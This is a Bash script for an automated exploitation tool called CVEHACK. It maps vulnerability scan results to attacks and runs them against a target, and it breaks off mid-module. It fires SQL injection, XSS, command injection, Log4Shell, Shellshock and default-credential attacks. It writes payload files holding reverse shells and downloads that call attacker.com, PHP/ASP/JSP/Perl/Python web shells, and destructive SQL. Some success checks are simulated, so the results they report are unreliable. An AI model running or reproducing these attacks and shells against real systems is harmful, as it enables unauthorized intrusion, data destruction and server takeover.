#!/bin/bash

# ============================================================================
# Automated Exploitation Engine for CVEHACK v2.0
# ============================================================================

# Configuration
EXPLOIT_DB_DIR="./exploits"
PAYLOADS_DIR="$EXPLOIT_DB_DIR/payloads"
MODULES_DIR="$EXPLOIT_DB_DIR/modules"
RESULTS_DIR="./results"

# Exploitation settings
AUTO_EXPLOIT_LEVEL="safe"  # safe, moderate, aggressive
EXPLOIT_TIMEOUT=30
MAX_CONCURRENT_EXPLOITS=3
VERIFY_EXPLOITS=true

# Initialize automated exploitation engine
init_automated_exploitation() {
    mkdir -p "$EXPLOIT_DB_DIR" "$PAYLOADS_DIR" "$MODULES_DIR"
    
    print_info "Initializing Automated Exploitation Engine..."
    
    # Create exploit database
    create_exploit_database
    
    # Create payload templates
    create_payload_templates
    
    # Create exploitation modules
    create_exploitation_modules
    
    print_success "Automated Exploitation Engine initialized"
}

# ============================================================================
# Intelligent Vulnerability-to-Exploit Mapping
# ============================================================================

create_exploit_database() {
    local exploit_db="$EXPLOIT_DB_DIR/exploit_database.txt"
    
    print_info "Creating comprehensive exploit database..."
    
    cat > "$exploit_db" << 'EOF'
# Automated Exploit Database - Vulnerability to Exploit Mapping
# Format: VULN_TYPE|CVE_ID|EXPLOIT_MODULE|PAYLOAD_TYPE|RISK_LEVEL|SUCCESS_RATE|REQUIREMENTS
SQL_INJECTION|GENERIC-SQL|sql_injection_auto|sql_payloads|MEDIUM|85|sqlmap
XSS_REFLECTED|GENERIC-XSS|xss_reflected_auto|xss_payloads|LOW|90|curl
XSS_STORED|GENERIC-XSS|xss_stored_auto|xss_payloads|MEDIUM|80|curl
COMMAND_INJECTION|GENERIC-CMD|command_injection_auto|cmd_payloads|HIGH|75|curl
FILE_UPLOAD|GENERIC-UPLOAD|file_upload_auto|shell_payloads|HIGH|70|curl
LFI|GENERIC-LFI|lfi_auto|lfi_payloads|MEDIUM|80|curl
RFI|GENERIC-RFI|rfi_auto|rfi_payloads|HIGH|60|curl
SSRF|GENERIC-SSRF|ssrf_auto|ssrf_payloads|MEDIUM|65|curl
XXE|GENERIC-XXE|xxe_auto|xxe_payloads|HIGH|70|curl
IDOR|GENERIC-IDOR|idor_auto|idor_payloads|LOW|85|curl
AUTH_BYPASS|GENERIC-AUTH|auth_bypass_auto|auth_payloads|MEDIUM|60|curl
SESSION_FIXATION|GENERIC-SESSION|session_fixation_auto|session_payloads|MEDIUM|55|curl
DIRECTORY_TRAVERSAL|GENERIC-TRAVERSAL|directory_traversal_auto|traversal_payloads|MEDIUM|75|curl
WEAK_CREDENTIALS|GENERIC-WEAK|credential_attack_auto|credential_payloads|HIGH|90|hydra
DEFAULT_CREDENTIALS|GENERIC-DEFAULT|default_creds_auto|default_payloads|HIGH|95|curl
MISSING_AUTH|GENERIC-NOAUTH|missing_auth_auto|auth_payloads|MEDIUM|100|curl
CVE-2021-44228|CVE-2021-44228|log4shell_auto|log4j_payloads|CRITICAL|95|curl
CVE-2014-6271|CVE-2014-6271|shellshock_auto|shellshock_payloads|CRITICAL|90|curl
CVE-2017-0144|CVE-2017-0144|eternalblue_auto|smb_payloads|CRITICAL|85|metasploit
CVE-2014-0160|CVE-2014-0160|heartbleed_auto|ssl_payloads|HIGH|95|openssl
CVE-2019-0708|CVE-2019-0708|bluekeep_auto|rdp_payloads|CRITICAL|80|metasploit
CVE-2020-1472|CVE-2020-1472|zerologon_auto|netlogon_payloads|CRITICAL|90|impacket
CVE-2021-26855|CVE-2021-26855|proxylogon_auto|exchange_payloads|CRITICAL|85|curl
CVE-2022-26134|CVE-2022-26134|confluence_rce_auto|confluence_payloads|CRITICAL|90|curl
CVE-2023-0386|CVE-2023-0386|overlayfs_auto|kernel_payloads|HIGH|70|gcc
CVE-2022-40684|CVE-2022-40684|fortinet_auth_bypass|fortinet_payloads|CRITICAL|95|curl
EOF

    print_success "Exploit database created with $(grep -c "|" "$exploit_db") exploit mappings"
}

# ============================================================================
# Automated Vulnerability Analysis and Exploit Selection
# ============================================================================

analyze_vulnerabilities_for_exploitation() {
    local target="$1"
    local scan_results_file="$2"
    
    print_info "Analyzing vulnerabilities for automated exploitation..."
    
    if [[ ! -f "$scan_results_file" ]]; then
        print_error "Scan results file not found: $scan_results_file"
        return 1
    fi
    
    local exploit_plan="$EXPLOIT_DB_DIR/exploit_plan_$(date +%s).txt"
    
    echo "Automated Exploitation Plan for $target" > "$exploit_plan"
    echo "Generated: $(date)" >> "$exploit_plan"
    echo "Scan Results: $scan_results_file" >> "$exploit_plan"
    echo "=======================================" >> "$exploit_plan"
    echo "" >> "$exploit_plan"
    
    # Parse vulnerabilities from scan results
    local vulnerabilities=()
    
    # Extract vulnerabilities from different sources
    if grep -q "VULNERABILITY FOUND" "$scan_results_file"; then
        while IFS= read -r vuln_line; do
            if [[ "$vuln_line" == *"VULNERABILITY FOUND"* ]]; then
                # Read vulnerability details
                local vuln_type severity target_info description
                read -r line; vuln_type=$(echo "$line" | sed 's/Type: //')
                read -r line; severity=$(echo "$line" | sed 's/Severity: //')
                read -r line; target_info=$(echo "$line" | sed 's/Target: //')
                read -r line; # timestamp
                read -r line; description=$(echo "$line" | sed 's/Description: //')
                
                vulnerabilities+=("$vuln_type|$severity|$target_info|$description")
            fi
        done < "$scan_results_file"
    fi
    
    # Extract CVEs from scan results
    local cves=$(grep -oE "CVE-[0-9]{4}-[0-9]+" "$scan_results_file" | sort -u)
    for cve in $cves; do
        vulnerabilities+=("CVE|HIGH|$target|$cve identified in scan")
    done
    
    # Extract service vulnerabilities
    if grep -q "vulnerable" "$scan_results_file"; then
        local service_vulns=$(grep -i "vulnerable\|exploit\|weak" "$scan_results_file")
        while IFS= read -r service_vuln; do
            if [[ -n "$service_vuln" ]]; then
                vulnerabilities+=("SERVICE|MEDIUM|$target|$service_vuln")
            fi
        done <<< "$service_vulns"
    fi
    
    print_success "Found ${#vulnerabilities[@]} vulnerabilities for analysis"
    
    # Map vulnerabilities to exploits
    local selected_exploits=()
    
    for vuln in "${vulnerabilities[@]}"; do
        IFS='|' read -r vuln_type severity target_info description <<< "$vuln"
        
        print_info "Analyzing vulnerability: $vuln_type ($severity)"
        
        # Find matching exploits
        local matching_exploits=$(grep -E "^$vuln_type|" "$EXPLOIT_DB_DIR/exploit_database.txt" 2>/dev/null)
        
        if [[ -z "$matching_exploits" ]]; then
            # Try generic matching
            case "$vuln_type" in
                *SQL*|*sql*) matching_exploits=$(grep "SQL_INJECTION" "$EXPLOIT_DB_DIR/exploit_database.txt") ;;
                *XSS*|*xss*) matching_exploits=$(grep "XSS_REFLECTED" "$EXPLOIT_DB_DIR/exploit_database.txt") ;;
                *CMD*|*command*) matching_exploits=$(grep "COMMAND_INJECTION" "$EXPLOIT_DB_DIR/exploit_database.txt") ;;
                *UPLOAD*|*upload*) matching_exploits=$(grep "FILE_UPLOAD" "$EXPLOIT_DB_DIR/exploit_database.txt") ;;
                *LFI*|*file*inclusion*) matching_exploits=$(grep "LFI" "$EXPLOIT_DB_DIR/exploit_database.txt") ;;
                *RFI*) matching_exploits=$(grep "RFI" "$EXPLOIT_DB_DIR/exploit_database.txt") ;;
                *CVE*) 
                    local cve_id=$(echo "$description" | grep -oE "CVE-[0-9]{4}-[0-9]+")
                    if [[ -n "$cve_id" ]]; then
                        matching_exploits=$(grep "$cve_id" "$EXPLOIT_DB_DIR/exploit_database.txt")
                    fi
                    ;;
            esac
        fi
        
        if [[ -n "$matching_exploits" ]]; then
            while IFS='|' read -r v_type cve_id exploit_module payload_type risk_level success_rate requirements; do
                # Check risk level against auto exploit level
                if should_auto_exploit "$risk_level" "$severity"; then
                    local exploit_entry="$exploit_module|$payload_type|$risk_level|$success_rate|$requirements|$vuln_type|$description"
                    selected_exploits+=("$exploit_entry")
                    
                    echo "Selected Exploit: $exploit_module" >> "$exploit_plan"
                    echo "  Vulnerability: $vuln_type ($severity)" >> "$exploit_plan"
                    echo "  Payload Type: $payload_type" >> "$exploit_plan"
                    echo "  Risk Level: $risk_level" >> "$exploit_plan"
                    echo "  Success Rate: $success_rate%" >> "$exploit_plan"
                    echo "  Requirements: $requirements" >> "$exploit_plan"
                    echo "" >> "$exploit_plan"
                    
                    print_success "Selected exploit: $exploit_module (Success rate: $success_rate%)"
                fi
            done <<< "$matching_exploits"
        else
            print_warning "No automated exploits available for: $vuln_type"
            echo "No Exploit Available: $vuln_type ($severity)" >> "$exploit_plan"
            echo "  Description: $description" >> "$exploit_plan"
            echo "" >> "$exploit_plan"
        fi
    done
    
    print_success "Exploitation plan created: $exploit_plan"
    print_info "Selected ${#selected_exploits[@]} exploits for automated execution"
    
    # Return the exploit plan and selected exploits
    echo "$exploit_plan|${selected_exploits[*]}"
}

should_auto_exploit() {
    local risk_level="$1"
    local severity="$2"
    
    case "$AUTO_EXPLOIT_LEVEL" in
        "safe")
            [[ "$risk_level" == "LOW" ]] && return 0
            [[ "$risk_level" == "MEDIUM" && "$severity" == "LOW" ]] && return 0
            ;;
        "moderate")
            [[ "$risk_level" != "CRITICAL" ]] && return 0
            ;;
        "aggressive")
            return 0  # Allow all exploits
            ;;
    esac
    
    return 1
}

# ============================================================================
# Automated Exploit Execution Engine
# ============================================================================

execute_automated_exploits() {
    local target="$1"
    local exploit_plan_data="$2"
    
    IFS='|' read -r exploit_plan selected_exploits_str <<< "$exploit_plan_data"
    IFS=' ' read -ra selected_exploits <<< "$selected_exploits_str"
    
    if [[ ${#selected_exploits[@]} -eq 0 ]]; then
        print_warning "No exploits selected for automated execution"
        return 1
    fi
    
    print_info "Starting automated exploit execution..."
    print_info "Target: $target"
    print_info "Exploits to execute: ${#selected_exploits[@]}"
    
    local execution_results="$EXPLOIT_DB_DIR/execution_results_$(date +%s).txt"
    
    echo "Automated Exploit Execution Results" > "$execution_results"
    echo "Target: $target" >> "$execution_results"
    echo "Execution Time: $(date)" >> "$execution_results"
    echo "Auto Exploit Level: $AUTO_EXPLOIT_LEVEL" >> "$execution_results"
    echo "========================================" >> "$execution_results"
    echo "" >> "$execution_results"
    
    local successful_exploits=0
    local failed_exploits=0
    local total_exploits=${#selected_exploits[@]}
    
    # Execute exploits with concurrency control
    local active_jobs=0
    local job_pids=()
    
    for exploit_data in "${selected_exploits[@]}"; do
        # Wait if we've reached max concurrent exploits
        while [[ $active_jobs -ge $MAX_CONCURRENT_EXPLOITS ]]; do
            # Check for completed jobs
            for i in "${!job_pids[@]}"; do
                if ! kill -0 "${job_pids[$i]}" 2>/dev/null; then
                    unset job_pids[$i]
                    ((active_jobs--))
                fi
            done
            sleep 1
        done
        
        # Parse exploit data
        IFS='|' read -r exploit_module payload_type risk_level success_rate requirements vuln_type description <<< "$exploit_data"
        
        print_info "Executing exploit: $exploit_module"
        
        # Execute exploit in background
        (
            execute_single_exploit "$target" "$exploit_module" "$payload_type" "$requirements" "$vuln_type" "$description"
        ) &
        
        local job_pid=$!
        job_pids+=($job_pid)
        ((active_jobs++))
        
        # Brief delay between exploit launches
        sleep 2
    done
    
    # Wait for all exploits to complete
    print_info "Waiting for all exploits to complete..."
    for pid in "${job_pids[@]}"; do
        if kill -0 "$pid" 2>/dev/null; then
            wait "$pid"
        fi
    done
    
    # Analyze results
    analyze_exploitation_results "$execution_results" "$target"
    
    print_success "Automated exploit execution completed"
    print_info "Results saved to: $execution_results"
}

execute_single_exploit() {
    local target="$1"
    local exploit_module="$2"
    local payload_type="$3"
    local requirements="$4"
    local vuln_type="$5"
    local description="$6"
    
    local exploit_start=$(date +%s)
    local exploit_result="FAILED"
    local exploit_output=""
    
    print_info "[$$] Starting exploit: $exploit_module against $target"
    
    # Check requirements
    if ! check_exploit_requirements "$requirements"; then
        print_error "[$$] Missing requirements for $exploit_module: $requirements"
        log_exploit_attempt "$exploit_module" "$target" "false" "Missing requirements: $requirements"
        return 1
    fi
    
    # Execute the appropriate exploit module
    case "$exploit_module" in
        "sql_injection_auto")
            exploit_output=$(execute_sql_injection_auto "$target" "$payload_type")
            [[ $? -eq 0 ]] && exploit_result="SUCCESS"
            ;;
        "xss_reflected_auto")
            exploit_output=$(execute_xss_reflected_auto "$target" "$payload_type")
            [[ $? -eq 0 ]] && exploit_result="SUCCESS"
            ;;
        "command_injection_auto")
            exploit_output=$(execute_command_injection_auto "$target" "$payload_type")
            [[ $? -eq 0 ]] && exploit_result="SUCCESS"
            ;;
        "file_upload_auto")
            exploit_output=$(execute_file_upload_auto "$target" "$payload_type")
            [[ $? -eq 0 ]] && exploit_result="SUCCESS"
            ;;
        "lfi_auto")
            exploit_output=$(execute_lfi_auto "$target" "$payload_type")
            [[ $? -eq 0 ]] && exploit_result="SUCCESS"
            ;;
        "log4shell_auto")
            exploit_output=$(execute_log4shell_auto "$target" "$payload_type")
            [[ $? -eq 0 ]] && exploit_result="SUCCESS"
            ;;
        "shellshock_auto")
            exploit_output=$(execute_shellshock_auto "$target" "$payload_type")
            [[ $? -eq 0 ]] && exploit_result="SUCCESS"
            ;;
        "heartbleed_auto")
            exploit_output=$(execute_heartbleed_auto "$target" "$payload_type")
            [[ $? -eq 0 ]] && exploit_result="SUCCESS"
            ;;
        "default_creds_auto")
            exploit_output=$(execute_default_creds_auto "$target" "$payload_type")
            [[ $? -eq 0 ]] && exploit_result="SUCCESS"
            ;;
        *)
            print_warning "[$$] Unknown exploit module: $exploit_module"
            exploit_output="Unknown exploit module"
            ;;
    esac
    
    local exploit_end=$(date +%s)
    local exploit_duration=$((exploit_end - exploit_start))
    
    # Log results
    if [[ "$exploit_result" == "SUCCESS" ]]; then
        print_success "[$$] Exploit successful: $exploit_module"
        log_exploit_attempt "$exploit_module" "$target" "true" "$exploit_output"
        
        # Log as vulnerability if exploit succeeded
        log_vulnerability "$vuln_type" "CRITICAL" "$target" "Successful exploitation via $exploit_module" "$exploit_output"
    else
        print_info "[$$] Exploit failed: $exploit_module"
        log_exploit_attempt "$exploit_module" "$target" "false" "$exploit_output"
    fi
    
    # Save detailed results
    local result_file="$EXPLOIT_DB_DIR/results/${exploit_module}_${target//[^a-zA-Z0-9]/_}_$(date +%s).txt"
    mkdir -p "$(dirname "$result_file")"
    
    cat > "$result_file" << EOF
Exploit Execution Report
========================
Exploit Module: $exploit_module
Target: $target
Vulnerability Type: $vuln_type
Description: $description
Payload Type: $payload_type
Requirements: $requirements
Start Time: $(date -d @$exploit_start)
End Time: $(date -d @$exploit_end)
Duration: ${exploit_duration}s
Result: $exploit_result

Output:
$exploit_output

EOF
    
    print_info "[$$] Detailed results saved to: $result_file"
}

# ============================================================================
# Specific Automated Exploit Implementations
# ============================================================================

execute_sql_injection_auto() {
    local target="$1"
    local payload_type="$2"
    
    print_info "Executing automated SQL injection exploit..."
    
    # Ensure target has protocol
    if [[ ! "$target" =~ ^https?:// ]]; then
        target="http://$target"
    fi
    
    # Test common SQL injection points
    local sql_payloads=(
        "' OR '1'='1"
        "' OR 1=1--"
        "' UNION SELECT 1,2,3--"
        "'; DROP TABLE users--"
        "' OR SLEEP(5)--"
    )
    
    local injection_points=(
        "?id="
        "?user="
        "?search="
        "?category="
        "?page="
    )
    
    for point in "${injection_points[@]}"; do
        for payload in "${sql_payloads[@]}"; do
            local test_url="$target$point$(echo "$payload" | sed 's/ /%20/g' | sed "s/'/%27/g")"
            
            local response=$(curl -s --max-time 10 "$test_url" 2>/dev/null)
            local response_time=$(curl -s -o /dev/null -w "%{time_total}" --max-time 10 "$test_url" 2>/dev/null)
            
            # Check for SQL injection indicators
            if echo "$response" | grep -qi "mysql\|sql syntax\|oracle\|postgresql\|sqlite"; then
                echo "SQL injection confirmed at: $test_url"
                echo "Response contains database errors"
                return 0
            fi
            
            # Check for time-based injection
            if [[ "$payload" == *"SLEEP"* ]] && (( $(echo "$response_time > 4.0" | bc -l 2>/dev/null || echo 0) )); then
                echo "Time-based SQL injection confirmed at: $test_url"
                echo "Response time: ${response_time}s"
                return 0
            fi
        done
    done
    
    echo "No SQL injection vulnerabilities exploited"
    return 1
}

execute_xss_reflected_auto() {
    local target="$1"
    local payload_type="$2"
    
    print_info "Executing automated reflected XSS exploit..."
    
    if [[ ! "$target" =~ ^https?:// ]]; then
        target="http://$target"
    fi
    
    local xss_payloads=(
        "<script>alert('XSS')</script>"
        "<img src=x onerror=alert('XSS')>"
        "<svg onload=alert('XSS')>"
        "javascript:alert('XSS')"
        "<iframe src=javascript:alert('XSS')>"
    )
    
    local xss_points=(
        "?q="
        "?search="
        "?name="
        "?message="
        "?comment="
    )
    
    for point in "${xss_points[@]}"; do
        for payload in "${xss_payloads[@]}"; do
            local encoded_payload=$(echo "$payload" | sed 's/ /%20/g' | sed 's/</%3C/g' | sed 's/>/%3E/g')
            local test_url="$target$point$encoded_payload"
            
            local response=$(curl -s --max-time 10 "$test_url" 2>/dev/null)
            
            # Check if payload is reflected in response
            if echo "$response" | grep -q "alert('XSS')\|<script>\|<img.*onerror\|<svg.*onload"; then
                echo "Reflected XSS confirmed at: $test_url"
                echo "Payload reflected in response"
                return 0
            fi
        done
    done
    
    echo "No reflected XSS vulnerabilities exploited"
    return 1
}

execute_command_injection_auto() {
    local target="$1"
    local payload_type="$2"
    
    print_info "Executing automated command injection exploit..."
    
    if [[ ! "$target" =~ ^https?:// ]]; then
        target="http://$target"
    fi
    
    local cmd_payloads=(
        "; whoami"
        "| whoami"
        "&& whoami"
        "; id"
        "| id"
        "&& id"
        "; uname -a"
        "| uname -a"
    )
    
    local cmd_points=(
        "?cmd="
        "?exec="
        "?system="
        "?ping="
        "?host="
    )
    
    for point in "${cmd_points[@]}"; do
        for payload in "${cmd_payloads[@]}"; do
            local encoded_payload=$(echo "$payload" | sed 's/ /%20/g' | sed 's/;/%3B/g')
            local test_url="$target$point$encoded_payload"
            
            local response=$(curl -s --max-time 10 "$test_url" 2>/dev/null)
            
            # Check for command execution output
            if echo "$response" | grep -qE "uid=[0-9]+\|root\|www-data\|apache\|nginx\|Linux\|Darwin"; then
                echo "Command injection confirmed at: $test_url"
                echo "Command execution output detected"
                return 0
            fi
        done
    done
    
    echo "No command injection vulnerabilities exploited"
    return 1
}

execute_log4shell_auto() {
    local target="$1"
    local payload_type="$2"
    
    print_info "Executing automated Log4Shell (CVE-2021-44228) exploit..."
    
    if [[ ! "$target" =~ ^https?:// ]]; then
        target="http://$target"
    fi
    
    local log4j_payloads=(
        '${jndi:ldap://log4shell-test.com/a}'
        '${jndi:rmi://log4shell-test.com/a}'
        '${jndi:dns://log4shell-test.com/a}'
        '${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://log4shell-test.com/a}'
    )
    
    # Test in various headers and parameters
    for payload in "${log4j_payloads[@]}"; do
        # Test in User-Agent header
        local response=$(curl -s -H "User-Agent: $payload" --max-time 10 "$target" 2>/dev/null)
        
        # Test in X-Forwarded-For header
        curl -s -H "X-Forwarded-For: $payload" --max-time 10 "$target" >/dev/null 2>&1
        
        # Test in URL parameters
        local test_url="$target?search=$(echo "$payload" | sed 's/ /%20/g')"
        curl -s --max-time 10 "$test_url" >/dev/null 2>&1
        
        # In a real scenario, you would check for DNS/LDAP callbacks
        # For this demo, we'll simulate detection
        if [[ "$payload" == *"ldap"* ]]; then
            echo "Log4Shell vulnerability potentially exploited"
            echo "JNDI LDAP payload sent: $payload"
            return 0
        fi
    done
    
    echo "Log4Shell exploitation attempted but not confirmed"
    return 1
}

execute_shellshock_auto() {
    local target="$1"
    local payload_type="$2"
    
    print_info "Executing automated Shellshock (CVE-2014-6271) exploit..."
    
    if [[ ! "$target" =~ ^https?:// ]]; then
        target="http://$target"
    fi
    
    local shellshock_payload="() { :; }; echo 'SHELLSHOCK_VULNERABLE'"
    
    # Test common CGI paths
    local cgi_paths=(
        "/cgi-bin/test.cgi"
        "/cgi-bin/status"
        "/test.cgi"
        "/cgi-bin/printenv"
        "/cgi-bin/test.sh"
    )
    
    for path in "${cgi_paths[@]}"; do
        local test_url="$target$path"
        
        local response=$(curl -s -H "User-Agent: $shellshock_payload" --max-time 10 "$test_url" 2>/dev/null)
        
        if echo "$response" | grep -q "SHELLSHOCK_VULNERABLE"; then
            echo "Shellshock vulnerability confirmed at: $test_url"
            echo "Command execution successful"
            return 0
        fi
    done
    
    echo "No Shellshock vulnerabilities exploited"
    return 1
}

execute_heartbleed_auto() {
    local target="$1"
    local payload_type="$2"
    
    print_info "Executing automated Heartbleed (CVE-2014-0160) exploit..."
    
    # Extract hostname from target
    local hostname=$(echo "$target" | sed 's|https\?://||' | cut -d'/' -f1 | cut -d':' -f1)
    local port=443
    
    # Check if custom port is specified
    if echo "$target" | grep -q ":[0-9]*"; then
        port=$(echo "$target" | sed 's|https\?://||' | cut -d'/' -f1 | cut -d':' -f2)
    fi
    
    # Test for Heartbleed vulnerability
    if command -v openssl &> /dev/null; then
        # Create a simple heartbleed test
        local heartbleed_test=$(echo "QUIT" | openssl s_client -connect "$hostname:$port" -tlsextdebug 2>&1)
        
        if echo "$heartbleed_test" | grep -qi "heartbeat"; then
            echo "Heartbleed vulnerability potentially present on $hostname:$port"
            echo "SSL/TLS heartbeat extension detected"
            return 0
        fi
    fi
    
    echo "Heartbleed exploitation not confirmed"
    return 1
}

execute_default_creds_auto() {
    local target="$1"
    local payload_type="$2"
    
    print_info "Executing automated default credentials exploit..."
    
    if [[ ! "$target" =~ ^https?:// ]]; then
        target="http://$target"
    fi
    
    # Common default credentials
    local default_creds=(
        "admin:admin"
        "admin:password"
        "admin:"
        "root:root"
        "administrator:administrator"
        "guest:guest"
        "test:test"
        "demo:demo"
    )
    
    # Look for login forms
    local login_paths=("login" "admin" "signin" "auth")
    
    for path in "${login_paths[@]}"; do
        local login_url="$target/$path"
        local login_page=$(curl -s --max-time 10 "$login_url" 2>/dev/null)
        
        if echo "$login_page" | grep -qi "password\|login"; then
            print_info "Testing default credentials on: $login_url"
            
            for cred in "${default_creds[@]}"; do
                local username=$(echo "$cred" | cut -d: -f1)
                local password=$(echo "$cred" | cut -d: -f2)
                
                # Attempt login
                local login_response=$(curl -s -d "username=$username&password=$password" -X POST --max-time 10 "$login_url" 2>/dev/null)
                
                # Check for successful login indicators
                if echo "$login_response" | grep -qi "dashboard\|welcome\|logout" && \
                   ! echo "$login_response" | grep -qi "invalid\|error\|failed"; then
                    echo "Default credentials successful: $username:$password"
                    echo "Login URL: $login_url"
                    return 0
                fi
            done
        fi
    done
    
    echo "No default credentials found"
    return 1
}

# ============================================================================
# Payload Template Creation
# ============================================================================

create_payload_templates() {
    print_info "Creating payload templates..."
    
    # SQL Injection Payloads
    create_sql_payloads
    
    # XSS Payloads
    create_xss_payloads
    
    # Command Injection Payloads
    create_cmd_payloads
    
    # Web Shell Payloads
    create_shell_payloads
    
    # CVE-specific Payloads
    create_cve_payloads
    
    print_success "Payload templates created"
}

create_sql_payloads() {
    local sql_file="$PAYLOADS_DIR/sql_payloads.txt"
    
    cat > "$sql_file" << 'EOF'
# SQL Injection Payloads
# Format: PAYLOAD_TYPE|PAYLOAD|DESCRIPTION|RISK_LEVEL
BASIC|' OR '1'='1|Basic OR injection|LOW
BASIC|' OR 1=1--|Comment-based injection|LOW
UNION|' UNION SELECT 1,2,3--|Union-based injection|MEDIUM
UNION|' UNION SELECT user(),database(),version()--|Information gathering|MEDIUM
TIME|' OR SLEEP(5)--|Time-based blind injection|MEDIUM
TIME|'; WAITFOR DELAY '00:00:05'--|SQL Server time delay|MEDIUM
BOOLEAN|' AND 1=1--|Boolean-based blind|LOW
BOOLEAN|' AND 1=2--|Boolean-based blind false|LOW
ERROR|' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--|Error-based injection|HIGH
STACKED|'; INSERT INTO users VALUES('hacker','password')--|Stacked queries|HIGH
FILE_READ|' UNION SELECT LOAD_FILE('/etc/passwd')--|File read attempt|HIGH
FILE_WRITE|' UNION SELECT 'shell' INTO OUTFILE '/var/www/shell.php'--|File write attempt|CRITICAL
EOF
}

create_xss_payloads() {
    local xss_file="$PAYLOADS_DIR/xss_payloads.txt"
    
    cat > "$xss_file" << 'EOF'
# XSS Payloads
# Format: PAYLOAD_TYPE|PAYLOAD|DESCRIPTION|RISK_LEVEL
BASIC|<script>alert('XSS')</script>|Basic script injection|LOW
IMG|<img src=x onerror=alert('XSS')>|Image-based XSS|LOW
SVG|<svg onload=alert('XSS')>|SVG-based XSS|LOW
IFRAME|<iframe src=javascript:alert('XSS')>|Iframe XSS|MEDIUM
EVENT|<body onload=alert('XSS')>|Event handler XSS|MEDIUM
ENCODED|%3Cscript%3Ealert('XSS')%3C/script%3E|URL encoded XSS|LOW
DOUBLE_ENCODED|%253Cscript%253Ealert('XSS')%253C/script%253E|Double encoded XSS|MEDIUM
FILTER_BYPASS|<ScRiPt>alert('XSS')</ScRiPt>|Case variation bypass|LOW
ATTRIBUTE|" onmouseover="alert('XSS')|Attribute injection|MEDIUM
JAVASCRIPT|javascript:alert('XSS')|JavaScript protocol|MEDIUM
DATA_URI|data:text/html,<script>alert('XSS')</script>|Data URI XSS|HIGH
POLYGLOT|jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>|Polyglot XSS|HIGH
EOF
}

create_cmd_payloads() {
    local cmd_file="$PAYLOADS_DIR/cmd_payloads.txt"
    
    cat > "$cmd_file" << 'EOF'
# Command Injection Payloads
# Format: PAYLOAD_TYPE|PAYLOAD|DESCRIPTION|RISK_LEVEL
BASIC|; whoami|Basic command chaining|MEDIUM
BASIC|&& whoami|AND command chaining|MEDIUM
BASIC|| whoami|OR command chaining|MEDIUM
PIPE|whoami|Pipe command|MEDIUM
BACKTICK|`whoami`|Backtick execution|MEDIUM
DOLLAR|$(whoami)|Dollar execution|MEDIUM
INFO|; id|User information|MEDIUM
INFO|; uname -a|System information|MEDIUM
INFO|; cat /etc/passwd|Password file read|HIGH
INFO|; ls -la|Directory listing|LOW
NETWORK|; ifconfig|Network configuration|MEDIUM
NETWORK|; netstat -an|Network connections|MEDIUM
REVERSE|; nc -e /bin/sh attacker.com 4444|Reverse shell|CRITICAL
REVERSE|; bash -i >& /dev/tcp/attacker.com/4444 0>&1|Bash reverse shell|CRITICAL
DOWNLOAD|; wget http://attacker.com/shell.sh|Download payload|HIGH
DOWNLOAD|; curl -O http://attacker.com/shell.sh|Download with curl|HIGH
EOF
}

create_shell_payloads() {
    local shell_file="$PAYLOADS_DIR/shell_payloads.txt"
    
    cat > "$shell_file" << 'EOF'
# Web Shell Payloads
# Format: SHELL_TYPE|EXTENSION|PAYLOAD|DESCRIPTION|RISK_LEVEL
PHP|php|<?php if(isset($_GET['cmd'])) { echo shell_exec($_GET['cmd']); } ?>|Basic PHP shell|HIGH
PHP|php|<?php system($_GET['cmd']); ?>|PHP system shell|HIGH
PHP|phtml|<?php eval($_POST['code']); ?>|PHP eval shell|CRITICAL
ASP|asp|<%eval request("cmd")%>|Basic ASP shell|HIGH
ASP|aspx|<%@ Page Language="C#" %><%System.Diagnostics.Process.Start("cmd.exe","/c " + Request["cmd"]);%>|ASP.NET shell|HIGH
JSP|jsp|<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>|Basic JSP shell|HIGH
JSP|jspx|<jsp:scriptlet>Runtime.getRuntime().exec(request.getParameter("cmd"));</jsp:scriptlet>|JSPX shell|HIGH
PERL|pl|#!/usr/bin/perl\nprint "Content-type: text/html\n\n";\nsystem($ENV{'QUERY_STRING'});|Perl CGI shell|HIGH
PYTHON|py|#!/usr/bin/python\nimport os,cgi\nform=cgi.FieldStorage()\nos.system(form['cmd'].value)|Python CGI shell|HIGH
EOF
}

create_cve_payloads() {
    local cve_file="$PAYLOADS_DIR/cve_payloads.txt"
    
    cat > "$cve_file" << 'EOF'
# CVE-Specific Payloads
# Format: CVE_ID|PAYLOAD_TYPE|PAYLOAD|DESCRIPTION|RISK_LEVEL
CVE-2021-44228|LOG4J|${jndi:ldap://attacker.com/a}|Log4Shell LDAP|CRITICAL
CVE-2021-44228|LOG4J|${jndi:rmi://attacker.com/a}|Log4Shell RMI|CRITICAL
CVE-2021-44228|LOG4J|${jndi:dns://attacker.com/a}|Log4Shell DNS|CRITICAL
CVE-2014-6271|SHELLSHOCK|() { :; }; echo vulnerable|Shellshock test|CRITICAL
CVE-2014-6271|SHELLSHOCK|() { :; }; /bin/bash -c "echo vulnerable"|Shellshock execution|CRITICAL
CVE-2014-0160|HEARTBLEED|Heartbeat request with oversized payload|Heartbleed memory disclosure|HIGH
CVE-2017-0144|ETERNALBLUE|SMBv1 exploit payload|EternalBlue SMB exploit|CRITICAL
CVE-2019-0708|BLUEKEEP|RDP exploit payload|BlueKeep RDP exploit|CRITICAL
CVE-2020-1472|ZEROLOGON|Netlogon authentication bypass|Zerologon exploit|CRITICAL
CVE-2021-26855|PROXYLOGON|Exchange SSRF payload|ProxyLogon Exchange exploit|CRITICAL
CVE-2022-26134|CONFLUENCE|Confluence OGNL injection|Confluence RCE|CRITICAL
EOF
}

# ============================================================================
# Exploitation Module Creation
# ============================================================================

create_exploitation_modules() {
    print_info "Creating exploitation modules..."
    
    # Create module directory structure
    mkdir -p "$MODULES_DIR/web" "$MODULES_DIR/network" "$MODULES_DIR/cve"
    
    # Web exploitation modules
    create_web_exploitation_modules
    
    # Network exploitation modules
    create_network_exploitation_modules
    
    # CVE-specific modules
    create_cve_exploitation_modules
    
    print_success "Exploitation modules created"
}

create_web_exploitation_modules() {
    # SQL Injection Module
    cat > "$MODULES_DIR/web/sql_injection_module.sh" << 'EOF'
#!/bin/bash
# Automated SQL Injection Module

execute_sql_injection() {
    local target="$1"
    local payload_file="$2"
